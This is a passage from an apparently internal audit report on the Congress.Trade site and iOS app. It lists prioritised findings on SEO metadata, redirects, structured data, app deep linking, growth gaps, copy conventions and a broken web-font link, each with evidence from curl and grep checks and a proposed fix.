- **Fix:** Add description, canonical (https://congress.trade/privacy-policy etc.), og:title/description/image/url and twitter:card to legalHtml's head template.
- **Evidence:** Live curl 2026-08-19 of /privacy-policy: head contains only `<title>Privacy Policy · Congress.Trade</title>` — no `<meta name="description">`, no `<link rel="canonical">`, no og:*; origin/main app/src/ui/legalHtml.ts:125 `<title>${title} · Congress.Trade</title>` is the only head metadata (grep for description/canonical/og: -> nothing else), even after PR #2013 reworked the legal chrome.
- **Panel:** seo-social — Reproduced live and on origin/main legalHtml.ts (which is newer than local HEAD). · `seo-social/SEOSOCIAL-17`

#### 264. [P3] www.congress.trade serves the full site with 200 instead of 301 to the apex

- **Where:** Host handling  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Two hosts serve identical content; the canonical tag mitigates but a redirect is the robust signal and avoids split link equity / cookie scope issues.
- **Impact:** Minor duplicate-host risk; some tools/backlinks will keep pointing at www.
- **Fix:** Cloudflare Redirect Rule (or Hono middleware) `www.congress.trade/* -> https://congress.trade/$1` 301; add includeSubDomains to HSTS afterwards.
- **Evidence:** curl -A Chrome https://www.congress.trade/ (2026-08-19) -> HTTP 200 text/html 715,277 bytes (same document, canonical https://congress.trade/); http://congress.trade/ -> 301 to https. HSTS header is `max-age=31536000` without includeSubDomains (web/logs/headers.txt).
- **Panel:** seo-social — Reproduced live. · `seo-social/SEOSOCIAL-18`

#### 265. [P3] Meta/OG copy says 'feed' and uses single spaces between sentences (owner conventions)

- **Where:** app/src/ui/dashboardHtml.ts:103  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The two most-seen pieces of copy off-site (SERP snippet and share-card description) violate the owner's terminology and spacing rules.
- **Impact:** Convention defect; inconsistent brand voice in search results and unfurls.
- **Fix:** Rewrite both without 'feed' (e.g. 'a live Trades tab, politician and ticker analytics, and premium alerts') and use two spaces (a literal double space survives inside a content attribute; no `&nbsp;` needed).
- **Evidence:** app/src/ui/dashboardHtml.ts:102 (and live HTML) description '…not a third-party API reskin. Congress.Trade runs its own pipeline to parse official disclosures into a live, filterable feed with member/ticker analytics and premium webhooks.' — two sentences separated by ONE space and the word 'feed'; app/src/ui/ogMeta.ts:31-32 DEFAULT_DESC '…a live congressional stock-trade feed, not a wrapper around one third-party API.' Owner rules (CONTEXT.md): say 'Trades tab', never 'feed'; two spaces between sentences in all user-visible prose.
- **Panel:** seo-social — Quoted text matches source and live HTML. · `seo-social/SEOSOCIAL-20`

#### 266. [P3] /admin and operator-view markup are indexable: no noindex, admin headings ship in the crawlable HTML of /

- **Where:** /admin, ?view=admin|review, shared document  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Search engines index the homepage text including operator-panel headings, and /admin is a 200 page.  Snippets or site: searches can surface 'Admin Access', 'Runtime Secrets', 'Users & Recent Logins' under congress.trade.
- **Impact:** Odd/embarrassing snippets; invites probing; thin duplicate at /admin.  (Security exposure of the anonymous admin shell itself is another lens.)
- **Fix:** Send `X-Robots-Tag: noindex` for /admin and when ?view=admin|review; ideally stop shipping admin/review markup to anonymous sessions (render it only after a token is present).
- **Evidence:** curl https://congress.trade/admin (2026-08-19) -> HTTP 200 text/html 715,277 bytes, no x-robots-tag header, 0 `<meta name="robots">`, canonical rewritten to `/` (app/src/ui/ogMeta.ts:115); the served HTML of `/` contains `<h3>Admin Access</h3>` (dashboardHtml.ts:3035), `<h3 style="margin-top:14px">Settings / Runtime Secrets</h3>` (:3189), `<h3 style="margin-top:14px">Users &amp; Recent Logins</h3>` (:3199), 'Document Review &amp; Model Comparison', 'LLM Spend &amp; Extraction Metrics (30 Days)' — all in the static markup a crawler indexes.
- **Panel:** seo-social — All five headings found in the live anonymous HTML; /admin 200 with no robots header reproduced. · `seo-social/SEOSOCIAL-21`

#### 267. [P3] No <h1> on the SPA — heading outline starts at <h3>

- **Where:** All views  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Search engines and screen readers use the h1 as the page topic; the site has none, and the only static h2s are dialog titles.
- **Impact:** Weaker on-page relevance signal; a11y outline is odd (also flagged in a11y lens).
- **Fix:** Give each view a real `<h1>` (visually styled like the current section header or visually-hidden), e.g. 'Congressional trading trends', 'Recent STOCK Act trades', 'Politician directory', and h1 for member/ticker drawers when opened via deep link.
- **Evidence:** grep '<h1' on live HTML (2026-08-19) -> 0 and app/src/ui/dashboardHtml.ts -> 0; static <h2>s are only 'Sign In to Congress.Trade' (login modal) and 'Premium' (pricing modal); everything else starts at <h3>; brand is an `<img alt="Congress.Trade">` in a div (:2498-2499).
- **Panel:** seo-social — Reproduced; note the pricing modal also has an <h2> (evidence tightened). · `seo-social/SEOSOCIAL-23`

#### 316. [P3] No retention/lifecycle messaging: no welcome, no trial-ending reminder, no win-back, no digest

- **Where:** Auth + billing backend  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** A signed-up or trialing user never hears from the product again unless they come back.  Trial expiry converts silently into a charge (or a cancel) with no nudge to activate.
- **Impact:** Lower trial→paid conversion and higher involuntary churn; no re-engagement channel.
- **Fix:** Using the Resend transport already configured: welcome email on first sign-in (what you can do, link to Delivery/app), trial_will_end (3 days) webhook → reminder with usage recap, payment_failed → dunning, and an opt-in weekly 'top trades' digest for all accounts.  Ensure Stripe dashboard trial reminder emails are on as a stopgap.
- **Evidence:** grep 'sendEmail(' across app/src: only auth/routes.ts:264 (magic link, UI removed per #2010) and alerts/notify.ts:51 (admin-only ops alerts) — confirmed, no other call sites.  billing/routes.ts's full webhook switch (re-read) handles exactly `checkout.session.completed`, `customer.subscription.created`, `customer.subscription.updated`, `customer.subscription.deleted` — no `customer.subscription.trial_will_end`, no `invoice.payment_failed` case anywhere (confirmed by grep, zero hits for both strings in billing/routes.ts).
- **Panel:** growth-onboarding — Confirmed sendEmail call-site count and confirmed the billing webhook switch has exactly the 4 cited event types and none of the lifecycle ones. · merged: billing/BILLING-25 · `growth-onboarding/GROWTHONBOARDING-15`

#### 325. [P3] No structured data (JSON-LD) at all — no Organization/WebSite, Person, Dataset or FAQ

- **Where:** <head> of all pages  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The site is a first-party dataset of public records with clear entities (politicians, securities, filings) but exposes none of it in schema.org markup, so it is ineligible for rich results (sitelinks search box, dataset search, knowledge-panel associations) and gives LLM/answer engines nothing structured.
- **Impact:** Missed rich-result eligibility (Google Dataset Search for the disclosure corpus, Person entities, FAQ), weaker entity understanding.
- **Fix:** Server-inject JSON-LD: `Organization`+`WebSite` (with `potentialAction: SearchAction` -> `/?view=trades&fq={search_term_string}`) on `/`; `Person` (name, jobTitle, sameAs bioguide/house.gov URL) on ?member=; `Dataset` (STOCK Act disclosures, license, distribution -> CSV/RSS) on `/`; `FAQPage` for the disclaimer/how-it-works copy.
- **Evidence:** grep 'ld+json' and 'itemprop' on the live HTML (2026-08-19) -> 0 / 0; app/src/ui/dashboardHtml.ts head (:92-127) has only OG/Twitter/icon meta.
- **Panel:** seo-social — Reproduced on live HTML. · `seo-social/SEOSOCIAL-11`

#### 326. [P3] No App Store smart banner, no apple-app-site-association, no Associated Domains — iOS share links open Safari, not the app

- **Where:** <head>; /.well-known/; iOS entitlements  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I10; issue #1048 OPEN; also leftover F1 in open PR #1973 parity audit)
- **What:** Links the iOS app itself shares (and any web link tapped on iPhone) open in Safari instead of deep-linking into the installed app; there is no smart banner to promote install to iPhone web visitors.
- **Impact:** App-install growth loop missing; shared content lands in the web SPA even for users who have the app.
- **Fix:** Serve `/.well-known/apple-app-site-association` (application/json, `applinks.details[{appIDs:[TEAMID.trade.congress.ios], components:[{"?":{"trade":"*"}},{"?":{"member":"*"}},{"?":{"ticker":"*"}}]}]`), add `applinks:congress.trade` entitlement, handle https URLs in onOpenURL/`onContinueUserActivity`, and add `<meta name="apple-itunes-app" content="app-id=<ID>, app-argument=<current URL>">` once the app is live.  Priority rises to P2 the day the app is on the store.
- **Evidence:** curl https://congress.trade/.well-known/apple-app-site-association -> 404 text/plain (2026-08-19); served HTML has 0 `apple-itunes-app`; clients/ios/CongressTrade/CongressTrade.entitlements keys are only aps-environment + com.apple.developer.applesignin (no associated-domains); clients/ios/CongressTrade/App.swift:297-302 onOpenURL handles only `congresstrade://auth?token=`; iOS ShareLink emits https://congress.trade/?trade|member|ticker= (APIClient.swift:165 shareURL). Issue #1048 OPEN; open Cursor audit PR #1973 lists 'iOS cannot open the ?trade=/?member=/?ticker= links it shares' as leftover F1.
- **Panel:** seo-social — All evidence reproduced; status enriched with PR #1973 which tracks the same gap (report-only, no fix merged). · merged: app-store-compliance/APPSTORECOMPLIANCE-15, ios-engineering/IOSENGINEERING-29, ios-hig-ux/IOSHIGUX-29, ios-shipped-app/IOSSHIPPEDAPP-51, prior-review-followup/PRIORREVIEWFOLLOWUP-22 · `seo-social/SEOSOCIAL-15`

#### 335. [P3] Mobile web hides Sign In / Upgrade inside the hamburger — no visible CTA in the chrome

- **Where:** app/src/ui/dashboardHtml.ts:11591-11615, 11658-11660  ·  **Surface:** Web · mobile  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P1-3 'Sign In / Upgrade not one control group'; desktop fixed, mobile buried)
- **What:** On the form factor most visitors use, the conversion CTA is one tap deeper than every content tab and invisible by default.
- **Impact:** Fewer pricing-modal opens on mobile; Upgrade is discoverable only by accident.
- **Fix:** Show a compact 'Upgrade' pill (or avatar when signed in) beside the hamburger on mobile, and/or promote the Trades gate-note to a sticky dismissible banner after N scrolls.  Measure with -04.
- **Evidence:** mobile/trends.png: header is logo + ☰ only; mobile/m-nav-open.png shows Sign In / Upgrade only after opening the menu.  Traced the exact markup: renderAccount() (dashboardHtml.ts:11591 onward) builds identical Sign-In/Upgrade `authGroup` HTML for both `desktopHtml` and `mobileHtml` (:11594-11610), but `mobileHtml` is injected into `<div class="acct-mobile-menu" id="acctMobileMenu">` (:11660) which is `display:none` until `.open` is toggled by the hamburger button (`.acct-hamburger` at :11659, CSS confirms `.acct-mobile-menu.open { display:grid }` at ~:1334) — so the mobile top bar shows only the hamburger glyph (`&#9776;`) before any tap.  Bottom tab bar (Trends/Trades/Directory/Delivery) has no account/upgrade item.
- **Panel:** growth-onboarding — Traced the full renderAccount()/toggleAcctMobileMenu() DOM+CSS chain, confirming mobileHtml is hidden inside a collapsed menu by default.  Confirmed the 2026-08-10 review P1-3 citation is accurate (desktop grouped control landed since; mobile remains a hamburger-only pattern). · `growth-onboarding/GROWTHONBOARDING-16`

#### 369. [P3] /pricing is a redirect to a modal over the Delivery tab — no standalone pricing/landing page for ads, SEO or the App Store link

- **Where:** app/src/ui/routes.ts:221  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Paid/social traffic and the iOS footer link land on a modal with no comparison table, FAQ, or trust content; 302 (not 301) and no unique meta means it cannot rank or be shared meaningfully.
- **Impact:** Weak destination for any acquisition campaign; ad quality scores suffer.
- **Fix:** Serve a real /pricing page (same shell, server-filled title/OG) with Free vs Premium table, FAQ (trial, cancel, Apple vs Stripe), 'what you get first' proof, and CTAs; keep the modal for in-app upsell.
- **Evidence:** ui/routes.ts:221 `r.get('/pricing', (c) => c.redirect('/?pricing=1&view=subs', 302))` (exact line and code confirmed).  desktop/pricing.png shows the modal over the developer-oriented Delivery view; closing it leaves the visitor on Delivery.  Title/OG for that URL are the generic defaults (no `pricing` branch in resolveOgMeta, per GROWTHONBOARDING-08's confirmed read of ogMeta.ts).
- **Panel:** growth-onboarding — Route confirmed exact at ui/routes.ts:221. · merged: seo-social/SEOSOCIAL-19 · `growth-onboarding/GROWTHONBOARDING-17`

#### 386. [P4] Web → iOS cross-promotion absent: no Smart App Banner, no App Store/TestFlight link, no universal-link prep

- **Where:** Head meta, footer, Delivery tab  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Forward-looking: once the app is approved, web visitors (and the 'push is in the iOS app' sentence) need a one-tap path to install; shared `?member=` links should open the app.
- **Impact:** Missed install funnel from the existing web audience at launch.
- **Fix:** On approval: add `<meta name="apple-itunes-app" content="app-id=…, app-argument=<current URL>">`, footer 'iPhone app' link, and AASA for universal links (pairs with -10 path routes).  Until then, add a 'Join the TestFlight' link or remove the app reference.
- **Evidence:** grep 'apple-itunes-app' in dashboardHtml.ts and 'apple-app-site-association' in ui-routes.ts: zero hits, confirmed.  Footer links (dashboardHtml.ts:3409-3416) have no 'Get the app' entry.  iOS is pre-launch (docs/EFFORT-LOG.md / recent commits reference 'Tahoe GM App Store resubmit', consistent with 1.0 PREPARE_FOR_SUBMISSION).
- **Panel:** growth-onboarding — Confirmed zero hits for both meta patterns; iOS pre-launch status consistent with repo's recent commit history. · merged: web-mobile/WEBMOBILE-18, web-ux-desktop/WEBUXDESKTOP-43 · `growth-onboarding/GROWTHONBOARDING-23`

#### 406. [P4] Head/meta polish: no og:locale or twitter:site, theme-color light while manifest is dark, favicon.ico is a PNG

- **Where:** <head>, site.webmanifest  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Small completeness gaps in the social/PWA metadata layer.
- **Impact:** Minor: X cards don't attribute a handle; installed-PWA splash uses a dark theme while the app defaults light; some legacy crawlers expect a real .ico.
- **Fix:** Add `og:locale=en_US`, `twitter:site=@<handle>` (if an X account exists) and `twitter:image:alt`; align manifest theme/background with the light default (or use media-scoped theme-color meta); serve a real .ico or point rel=icon at the PNG only.
- **Evidence:** dashboardHtml.ts:104 / live `<meta name="theme-color" content="#eff3f8">` vs live /site.webmanifest `"theme_color":"#08111f","background_color":"#08111f"`; live head has og:type/site_name/title/description/url/image(+type/dims/alt) and twitter:card/title/description/image but no `og:locale`, `twitter:site`/`twitter:creator`, `twitter:image:alt`; routes.ts:204 `r.get('/favicon.ico', serveAsset(FAVICON_PNG, LONG))` and live /favicon.ico content-type image/png.
- **Panel:** seo-social — Reproduced live. · `seo-social/SEOSOCIAL-24`

#### 407. [P4] iOS ShareLink shares a bare URL with no subject/message; web has no share-to-X/LinkedIn intent

- **Where:** iOS Trade/Politician/Ticker detail toolbars; web drawers  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Shared payloads carry no human text ('Nancy Pelosi bought NVDA $1m–$5m on Aug 5 — congress.trade/?trade=…'), so Messages/Mail/X drafts start empty and, until SEOSOCIAL-05 lands, unfurl generically.
- **Impact:** Lower share completion and CTR.
- **Fix:** Use `ShareLink(item:subject:message:preview:)` with a one-line trade/politician summary and the ticker logo/photo as SharePreview; on web add 'Share on X' (`https://x.com/intent/post?text=…&url=…`) next to Copy link.
- **Evidence:** clients/ios/CongressTrade/Views/Feed/TradeDetailView.swift:108 `ShareLink(item: shareURL)` (also PoliticianDetailView.swift:131, TickerDetailView.swift:141) — no `subject:`/`message:` or SharePreview; web copyLinkHtml only copies the URL (app/src/ui/dashboardHtml.ts:10542-10550); served JS has 0 `x.com/intent` or `twitter.com/intent`.
- **Panel:** seo-social — iOS line refs verified; copyLinkHtml starts at 10542 (corrected). · `seo-social/SEOSOCIAL-25`

#### 426. [P4] Share-card images are static skeleton art per context — dynamic per-entity OG cards assessed but not built

- **Where:** og:image for ?member= / ?ticker= / ?trade=  ·  **Surface:** Web  ·  **Category:** growth  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)
- **What:** Every politician/ticker/trade shares the same picture; the card carries no data (name, party, trade count, ticker logo, buy/sell bar), which is what makes finance/politics cards get clicked on X and iMessage.
- **Impact:** Lower CTR on shares; brand looks templated.
- **Fix:** Build `/og/member/:slug.png`, `/og/ticker/:sym.png`, `/og/trade/:id.png` with Satori+resvg (per the feasibility note) or a pre-rendered cache, with a freshness token in the URL; wire into ogMeta.imageUrl.
- **Evidence:** app/src/ui/ogMeta.ts:34-45 `imagePath()` maps context -> one of four fixed PNGs (/og-image-trends.png, -company, -politician, default); live ?member=house-ca11-nancy-pelosi and any other member return the same /og-image-politician.png?v=23. docs/reviews/2026-08-11-dynamic-og-cards-feasibility.md: assessment only, 'qualified go', not built.
- **Panel:** seo-social — Code and feasibility doc verified; the image-content description ('POLITICIAN PROFILE skeleton') is taken from the lens's download and consistent with imageAlt text in ogMeta.ts. · `seo-social/SEOSOCIAL-16`

#### 430. [P4] No social proof anywhere (usage counts, data freshness, press, testimonials)

- **Where:** Landing, pricing modal, App Store listing  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** The product has genuinely strong proof points (first-party ingestion, live latency races vs.  FMP/Quiver/UW, thousands of filings) but never states them where conversion happens.
- **Impact:** Lower trust at decision points for a product that asks users to believe it is faster than incumbents.
- **Fix:** Add a freshness chip in the header ('Last filing 4 min ago'), a 'N filings · N politicians since 2012' line in the hero/pricing, and when the latency lead is positive show it in the pricing modal even mid-sample with 'n=…'.
- **Evidence:** Pricing modal proof line only renders when latency is favourable: `<p class="note" id="pricingProof">` (dashboardHtml.ts:3452) is populated by `setPricingProof()` (:10423 onward), an empty string otherwise; desktop/upgrade-modal.png shows none.  No 'last filing imported X min ago', subscriber count, or 'filings tracked since 2012' string found anywhere on Trends/pricing.
- **Panel:** growth-onboarding — Spot-checked (P4, light pass per instructions) — pricingProof element and setPricingProof() function existence confirmed at cited lines. · `growth-onboarding/GROWTHONBOARDING-19`

#### 455. [P4] No experimentation / feature-flag capability for A/B tests

- **Where:** Admin ui-settings / SPA  ·  **Surface:** Cross-surface  ·  **Category:** growth  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Copy, CTA placement and pricing-modal variants cannot be tested; decisions are opinion-driven.
- **Impact:** Slower growth iteration.
- **Fix:** After -04: add a tiny bucket cookie (hash of anon id → A/B), a KV-backed flags map served in the boot payload, and report conversion per variant in admin diagnostics.
- **Evidence:** The only runtime UI setting is the admin logo style: `window.__LOGO_DISPLAY__ = "%LOGO_DISPLAY%";` (dashboardHtml.ts:131, exact).  No variant assignment, no cookie/bucket, no event sink (see -04) found in a grep pass for variant/bucket/flag terms.
- **Panel:** growth-onboarding — Light pass (P4) — confirmed the single LOGO_DISPLAY setting and no other flag/variant infrastructure. · `growth-onboarding/GROWTHONBOARDING-20`

### Copy, terminology and the visual system (56)

The owner's own conventions (two spaces, 'Trades tab' not 'feed', wide separators, lowercase k/m/b) are violated in dozens of strings, the web font never loads, and web and iOS present the same data in two visual languages.

#### 12. [P1] No web font ever loads: the Google Fonts <link> URL is malformed and returns HTTP 400

- **Where:** app/src/ui/dashboardHtml.ts:99  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The single combined Google Fonts request fails because the Source Serif 4 axis tuple is invalid, so the whole stylesheet 400s and Inter (the site's declared body font) never loads; every visitor sees the system fallback stack.  Two of the three families are not even referenced by the CSS.
- **Impact:** Whole-site typography regression on desktop and mobile since #1963; also a wasted preconnect + a console/ORB error on every load and Lighthouse noise.
- **Fix:** Fix the URL to `family=Inter:wght@400;500;600;700;800&display=swap` (drop the unused IBM Plex Mono / Source Serif 4, or use valid `8..60,400;8..60,600;8..60,700` syntax if they are wanted) and add a unit test that the <link> URL matches the css2 tuple grammar; better, self-host Inter like Zilla Slab (line 327) so the CSP font-src/style-src exceptions can go too.
- **Evidence:** origin/main app/src/ui/dashboardHtml.ts:99 `<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;600;700&display=swap" rel="stylesheet">`. Re-verified byte-for-byte at that exact line in `git show origin/main:app/src/ui/dashboardHtml.ts`. Live curl of that exact URL -> HTTP 400 (reproduced 2026-08-19); the same request with a valid axis-tuple `8..60,400;8..60,600;8..60,700` -> HTTP 200. Live HTML at https://congress.trade/ still serves the identical malformed href. CSS only references `"Inter"` (line 189 `--sans:`); IBM Plex Mono / Source Serif 4 are requested but never used (`--mono:` line 188 is a system stack); Zilla Slab is already self-hosted via `@font-face ... src:url(/assets/zilla-slab-700.woff2)` at line 327.
- **Panel:** qa-bughunt — Reproduced live: fetched the exact malformed URL from the live HTML and got HTTP 400; confirmed the fix syntax returns HTTP 200.  Code citation at dashboardHtml.ts:99 matches origin/main exactly.  No changes needed. · merged: visual-design/VISUALDESIGN-01, web-perf/WEBPERF-01, seo-social/SEOSOCIAL-27 · `qa-bughunt/QABUGHUNT-01`

#### 115. [P2] Public web prose still single-spaced between sentences in ~30 strings

- **Where:** app/src/ui/dashboardHtml.ts:3472 (unchanged)  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** docs/FLEET-UI-COPY.md and CONTEXT.md make two spaces between sentences a binding owner rule for all human-read prose.  Roughly thirty public strings on the web SPA (plus the 500 page and meta description) still use a single space, including the pricing modal trial note every prospective subscriber reads.
- **Impact:** Owner-defined defect on the highest-visibility surfaces (pricing modal, Trends tooltips, Delivery, error/empty states); inconsistent rhythm next to correctly spaced paragraphs on the same page.
- **Fix:** Sweep the listed lines to `&nbsp; ` (HTML) / `\u00a0 ` (JS strings rendered via textContent/innerHTML) and add a unit test that greps dashboardHtml.ts/legalHtml.ts/ogMeta.ts/app.ts for `[a-z0-9)]\. [A-Z]` inside quoted/HTML text.
- **Evidence:** origin/main app/src/ui/dashboardHtml.ts:3472 `<p class="trial-note" id="pricingTrialNote">2-week free trial. No charge today.</p>` (live curl of https://congress.trade/ returns the same string); :3451 `The public dashboard stays free. Premium gets you the filing the moment we see it.`; :3155 `Sign in with Google to manage Delivery. Creating a delivery also requires Premium.`; :9286-9289 EST_VOLUME_TIP / BUY_PRESSURE_TIP / NET_FLOW_TIP(_ALLTIME) e.g. `…uses its $50,000,001 floor. Treat as a rough order of magnitude, not an exact figure.` (rendered single-spaced in desktop/trends-a11y.txt:33); :4489, :4494, :4497 column tips; :4444 seed-row note; :4785 `No columns are visible. Open Columns…`; :6771-6772, :6805, :6917, :7019 Delivery copy; :10982 historical source note; :11184/:11290 `No priced equity buys to score yet — … Options are excluded.`; :11320; :11980/:11983 clipboard toasts; :12528/:12536 trade-not-found notes; :56-57, :80, :88 speed-proof notes; :103 meta description; app/src/app.ts:38 500 page `An unexpected server error occurred. Please try refreshing…`.  Contrast :3024, :3061, :6714 correctly use `&nbsp; `.  Rule: docs/FLEET-UI-COPY.md §Two spaces between sentences.
- **Panel:** ux-copy — Every cited line re-read on origin/main and the strings are single-spaced; the pricing trial note and meta description also confirmed live via curl. · merged: visual-design/VISUALDESIGN-06, legal-compliance/LEGALCOMPLIANCE-21, delivery-alerts/DELIVERYALERTS-23 · `ux-copy/UXCOPY-01`

#### 116. [P2] iOS copy single-spaced between sentences in ~30 strings

- **Where:** Trades disclaimer banner, Trends notes, Trade Details, Delivery, Export sheet, sign-in/billing errors  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Same owner rule as UXCOPY-01; the iOS app mixes correctly double-spaced strings (Premium sheet, Delivery Premium section) with single-spaced ones in the disclaimer banner, Trends notes, trade detail, delivery notices, and every sign-in / billing error message.
- **Impact:** Owner-defined defect on App Store-visible screens (the disclaimer banner is the first thing shown on launch).
- **Fix:** Replace `. ` with `.  ` in the listed literals; add a CongressTradeTests string-lint that scans Views/ and Store/ for single-space sentence boundaries.
- **Evidence:** origin/main clients/ios/CongressTrade: Views/Feed/FeedDashboardView.swift:1182 `Congress.Trade is an informational tool for exploring public STOCK Act disclosures. Summaries are historical observational views — not trading signals or investment advice. Dollar figures are estimates…` (visible in ios/light/01-launch.png); :1221 `Exports the filtered feed for this range. Premium required.`; Views/TrendsView.swift:674 `…(curated committee→sector map). Observational — not evidence of impropriety.`, :1068 `Live new imports only (seed/historical backfills excluded). Matched against provider feeds…`; Views/Feed/TradeDetailView.swift:358 `…not portfolio P&L. Options are excluded.`; Views/Delivery/DeliveryView.swift:198, :246, :505; Store/AppleSignIn.swift:148/151/154; Store/ManageSubscription.swift:45-64 (7 strings, e.g. `Couldn't open your billing portal. Please try again.`); Store/CongressTradeStore.swift:683, :1022, :1075-1079, :1113, :1366; APIClient.swift:793 `Command is still running. Wait a moment, then retry if needed.`.  Contrast PremiumSheet.swift:63 and DeliveryView.swift:57 correctly use two spaces.
- **Panel:** ux-copy — All cited Swift lines re-read on origin/main; strings are single-spaced as quoted. · merged: ios-hig-ux/IOSHIGUX-08, ios-shipped-app/IOSSHIPPEDAPP-16, ios-engineering/IOSENGINEERING-18, ios-a11y/IOSA11Y-30 · `ux-copy/UXCOPY-02`

#### 117. [P2] "feed" terminology still used in user-facing web copy (banner, loading, error, pricing feature, meta, push body)

- **Where:** Top banner, Trades table loading/error, Premium modal feature list, meta description, latency notes, APNs body  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-9 flagged the banner)
- **What:** Owner convention (CONTEXT.md, memory): say "Trades tab", never "feed", in UI copy.  The banner, Trades loading/error states, the pricing modal's first bullet, the SEO description and the push-notification body all still say "feed".
- **Impact:** Owner-defined defect; the pricing modal bullet is the first Premium benefit users read.
- **Fix:** Banner → "Loading Congress.Trade…"; loading → "Loading trades…"; error → "Could not load trades: …"; pricing → "Full-history CSV export of the filtered Trades tab"; meta → "…into a live, filterable Trades tab…"; push → "New official trade on Congress.Trade."
- **Evidence:** origin/main dashboardHtml.ts:2706 `<div class="banner" id="banner">Connecting to the live feed…</div>` (confirmed live via curl); :4790-4791 & :12727 `'Loading live feed…'`; :5336 `'Could not load the live feed: ' + e.message`; :11769 pricingCopy default features `'Full-history CSV export of the filtered trade feed'` (confirmed live; visible in desktop/pricing.png bullet 1); :103 meta description `…into a live, filterable feed…`; :10254-10255 `provider-observed rows are not matched to our feed yet`.  Also app/src/delivery/apnsFanout.ts:131 push body `'New official trade is on the Congress.Trade feed.'`
- **Panel:** ux-copy — Banner and pricing bullet reproduced live; P2-9 in the 2026-08-10 review says exactly this and is unfixed. · merged: visual-design/VISUALDESIGN-07, growth-onboarding/GROWTHONBOARDING-21, prior-review-followup/PRIORREVIEWFOLLOWUP-10 · `ux-copy/UXCOPY-03`

#### 118. [P2] OG/meta descriptions say "House & Senate" only, lowercase "congressional", and "feed"

- **Where:** <meta name=description>, og:description / twitter:description default  ·  **Surface:** Web  ·  **Category:** seo  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (report-only blind-spots audit, BS-L1 "ToS and share cards are still Congress-only"; no code fix in flight)
- **What:** Share cards and the search snippet describe a House-and-Senate-only congressional feed, contradicting the product corpus rule and the capital-C rule, and using "feed" and lowercase "premium".
- **Impact:** Every shared link and every search result misdescribes coverage; explicit owner rule violation dated 2026-08-14.
- **Fix:** e.g.  "Official House, Senate, and Executive Branch STOCK Act disclosures, ingested and published by Congress.Trade itself — live trades, politician and ticker analytics, and Premium delivery."  Use two spaces if two sentences.
- **Evidence:** origin/main app/src/ui/ogMeta.ts:32 `'We ingest and publish official House & Senate STOCK Act disclosures ourselves — a live congressional stock-trade feed, not a wrapper around one third-party API.'`; dashboardHtml.ts:103 `content="First-party House &amp; Senate STOCK Act ingestion — not a third-party API reskin. … live, filterable feed with member/ticker analytics and premium webhooks."`; both confirmed live via `curl https://congress.trade/`.  Rules: docs/FLEET-UI-COPY.md:84-90 (corpus = House, Senate, and Executive Branch; OG/RSS must say so) and :25 (Congress/Congressional capital C).  RSS already says it right (delivery/rest.ts:877 `House, Senate, and Executive Branch`).
- **Panel:** ux-copy — Live HTML shows both strings; PR #1979 diff line 396 BS-L1 quotes the same DEFAULT_DESC, so it is tracked but not fixed. · `ux-copy/UXCOPY-05`

#### 119. [P2] Web CSV export copy implies a limited export is free ("Full-history export is Premium") but every CSV request requires Premium

- **Where:** Trades ⋯ menu → Export CSV dialog; export toasts  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** "Full-history" qualifier suggests date-bounded exports are free; they are not.
- **Impact:** Users pick a small date range, click Download CSV, and hit a 402 they were told they wouldn't; erodes trust in pricing copy.
- **Fix:** "CSV export (any date range) is a Premium feature.  Optional date range below." and toast "Sign in with a Premium account to export CSV."  (matches iOS FeedDashboardView.swift:1234).
- **Evidence:** origin/main dashboardHtml.ts:12856 `<p class="note">Optional date range (trade date).&nbsp; Full-history export is Premium.</p>`; :11898/:11921 `showToast('Sign in to export CSV — Premium required for full-history downloads.')`; but app/src/delivery/rest.ts:744-756 `GET /export/transactions.csv` returns 401 for anonymous and 402 `'CSV export requires a Premium account'` for every non-Premium user, with no date-range exception.
